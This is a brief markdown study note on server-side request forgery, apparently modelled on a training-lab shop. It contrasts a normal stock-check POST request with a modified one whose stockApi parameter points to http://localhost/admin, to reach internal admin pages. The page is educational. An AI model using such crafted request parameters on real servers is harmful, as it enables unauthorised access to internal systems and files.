# SSRF (Server Side Request Forgery)

Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. 

## Localhost server

With this POST method asking for an Api to provide it information we can divert the URL to asking him for sensible files.

If no security is provide from the server side and always trust the POST we can acess to privates files.

Regulare POST:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

Divert to:

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

---

[**:arrow_right_hook: Back home**](/README.md)